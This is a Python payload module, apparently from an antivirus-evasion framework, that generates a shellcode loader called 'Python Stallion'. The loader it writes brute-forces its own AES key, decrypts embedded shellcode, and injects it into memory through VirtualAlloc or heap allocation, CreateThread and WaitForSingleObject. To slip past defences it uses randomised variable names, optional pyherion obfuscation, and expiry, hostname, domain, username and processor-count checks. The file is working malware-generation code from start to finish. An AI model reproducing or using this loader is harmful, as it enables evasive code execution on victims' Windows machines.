"""

This payload constains encrypted shellcode, but not key in the file.  The script
brute forces itself to find the key via a known-plaintext attack, decrypts the 
shellcode, and then executes it.


Based off of CodeKoala which can be seen here:
http://www.codekoala.com/blog/2009/aes-encryption-python-using-pycrypto/
Looks like Dave Kennedy also used this code in SET
https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/setcore.py.


module by @christruncer

"""


from datetime import date
from datetime import timedelta
from Tools.Evasion.evasion_common import encryption
from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "AES Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"
        self.name = "Python Stallion"
        self.path = "python/shellcode_inject/stallion"
        self.cli_opts = cli_obj
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
            "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"]
        }

    def generate(self):

        # How I'm tracking the number of nested tabs needed
        # to make the payload
        num_tabs_required = 0
        payload_code = ''

        # Generate the variable names
        randctypes = evasion_helpers.randomString()
        ShellcodeVariableName = evasion_helpers.randomString()
        RandPtr = evasion_helpers.randomString()
        RandHt = evasion_helpers.randomString()
        RandEncShellCodePayload = evasion_helpers.randomString()
        known_plaintext_string = evasion_helpers.randomString()
        plaintext_string_variable = evasion_helpers.randomString()
        key_guess = evasion_helpers.randomString()
        secret_key = evasion_helpers.randomString()
        small_constrained_key_variable = evasion_helpers.randomString()
        decoded_ciphertext = evasion_helpers.randomString()
        decoded_known = evasion_helpers.randomString()
        decoded_shellcode = evasion_helpers.randomString()
        RandCipherObject = evasion_helpers.randomString()
        RandPadding = evasion_helpers.randomString()

        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode

        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = evasion_helpers.randomString()
            RandExpire = evasion_helpers.randomString()

            todaysdate = date.today()
            expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

            # Create Payload code
            payload_code += '\t' * num_tabs_required + 'from datetime import datetime\n'
            payload_code += '\t' * num_tabs_required + 'from datetime import date\n'
            payload_code += '\t' * num_tabs_required + RandToday + ' = datetime.now()\n'
            payload_code += '\t' * num_tabs_required + RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
            payload_code += '\t' * num_tabs_required + 'if ' + RandToday + ' < ' + RandExpire + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["HOSTNAME"][0].lower() != "x":

            rand_hostname = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import platform\n'
            payload_code += '\t' * num_tabs_required + rand_hostname + ' = platform.node()\n'
            payload_code += '\t' * num_tabs_required + 'if \"' + self.required_options["HOSTNAME"][0].lower() + '\" in ' + rand_hostname + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["DOMAIN"][0].lower() != "x":

            rand_domain = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import socket\n'
            payload_code += '\t' * num_tabs_required + rand_domain + ' = socket.getfqdn()\n'
            payload_code += '\t' * num_tabs_required + 'if \"' + self.required_options["DOMAIN"][0].lower() + '\" in ' + rand_domain + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["PROCESSORS"][0].lower() != "x":

            rand_processor_count = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import multiprocessing\n'
            payload_code += '\t' * num_tabs_required + rand_processor_count + ' = multiprocessing.cpu_count()\n'
            payload_code += '\t' * num_tabs_required + 'if ' + rand_processor_count + ' >= ' + self.required_options["PROCESSORS"][0] + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import getpass\n'
            payload_code += '\t' * num_tabs_required + rand_user_name + ' = getpass.getuser()\n'
            payload_code += '\t' * num_tabs_required + 'if \'' + self.required_options["USERNAME"][0].lower() + '\' in ' + rand_user_name + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        # encrypt the shellcode and get our randomized key
        encoded_ciphertext, constrained_key, encryption_key = encryption.constrained_aes(Shellcode)
        encoded_ciphertext = encoded_ciphertext.decode('ascii')

        # Use the secret we received earlier to encrypt our known plaintext string
        encrypted_plaintext_string = encryption.known_plaintext(encryption_key, known_plaintext_string)
        encrypted_plaintext_string = encrypted_plaintext_string.decode('ascii')

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":

            # Create Payload code
            payload_code += '\t' * num_tabs_required + 'import ctypes as ' + randctypes + '\n'
            payload_code += '\t' * num_tabs_required + 'from Crypto.Cipher import AES\n'
            payload_code += '\t' * num_tabs_required + 'import base64\n'
            payload_code += '\t' * num_tabs_required + 'import os\n'
            payload_code += '\t' * num_tabs_required + small_constrained_key_variable + ' = \'' + constrained_key + '\'\n'
            payload_code += '\t' * num_tabs_required + RandPadding + ' = \'*\'\n'
            payload_code += '\t' * num_tabs_required + 'for ' + key_guess + ' in range(1000000, 10000000):\n'
            payload_code += '\t' * num_tabs_required + '\t' + secret_key + " = \"" + constrained_key + '\" + str(' + key_guess + ')\n'
            payload_code += '\t' * num_tabs_required + '\t' + RandCipherObject + ' = AES.new(\'' + encryption_key + '\', AES.MODE_ECB)\n'
            payload_code += '\t' * num_tabs_required + '\t' + decoded_ciphertext + ' = base64.b64decode(\'' + encrypted_plaintext_string + '\')\n'
            payload_code += '\t' * num_tabs_required + '\t' + decoded_known + ' = ' + RandCipherObject + '.decrypt(' + decoded_ciphertext + ').decode(\'ascii\')\n'
            payload_code += '\t' * num_tabs_required + '\t' + 'if ' + decoded_known + '.rstrip(\'*\') == \'' + known_plaintext_string + '\':\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + decoded_shellcode + ' = base64.b64decode(\'' + encoded_ciphertext + '\')\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + ShellcodeVariableName + ' = ' + RandCipherObject + '.decrypt(' + decoded_shellcode + ')\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + RandPtr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len('+ ShellcodeVariableName +')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x40))\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + ShellcodeVariableName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\n'

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            HeapVar = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import ctypes as ' + randctypes + '\n'
            payload_code += '\t' * num_tabs_required + 'from Crypto.Cipher import AES\n'
            payload_code += '\t' * num_tabs_required + 'import base64\n'
            payload_code += '\t' * num_tabs_required + 'import os\n'
            payload_code += '\t' * num_tabs_required + small_constrained_key_variable + ' = \'' + constrained_key + '\'\n'
            payload_code += '\t' * num_tabs_required + RandPadding + ' = \'*\'\n'
            payload_code += '\t' * num_tabs_required + 'for ' + key_guess + ' in range(1000000, 10000000):\n'
            payload_code += '\t' * num_tabs_required + '\t' + secret_key + " = \'" + constrained_key + '\' + str(' + key_guess + ')\n'
            payload_code += '\t' * num_tabs_required + '\t' + RandCipherObject + ' = AES.new(\'' + encryption_key + '\', AES.MODE_ECB)\n'
            payload_code += '\t' * num_tabs_required + '\t' + decoded_ciphertext + ' = base64.b64decode(\'' + encrypted_plaintext_string + '\')\n'
            payload_code += '\t' * num_tabs_required + '\t' + decoded_known + ' = ' + RandCipherObject + '.decrypt(' + decoded_ciphertext + ').decode(\'ascii\')\n'
            payload_code += '\t' * num_tabs_required + '\t' + 'if ' + decoded_known + '.rstrip(\'*\') == \'' + known_plaintext_string + '\':\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + decoded_shellcode + ' = base64.b64decode(\'' + encoded_ciphertext + '\')\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + ShellcodeVariableName + ' = ' + RandCipherObject + '.decrypt(' + decoded_shellcode + ')\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + HeapVar + ' = ' + randctypes + '.windll.kernel32.HeapCreate(' + randctypes + '.c_int(0x00040000),' + randctypes + '.c_int(len(' + ShellcodeVariableName + ') * 2),' + randctypes + '.c_int(0))\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + RandPtr + ' = ' + randctypes + '.windll.kernel32.HeapAlloc(' + randctypes + '.c_int(' + HeapVar + '),' + randctypes + '.c_int(0x00000008),' + randctypes + '.c_int(len( ' + ShellcodeVariableName + ')))\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + ShellcodeVariableName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
            payload_code += '\t' * num_tabs_required + '\t\t' + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\n'

        if self.required_options["USE_PYHERION"][0].lower() == "y":
            payload_code = encryption.pyherion(payload_code)

        self.payload_source_code = payload_code
        return
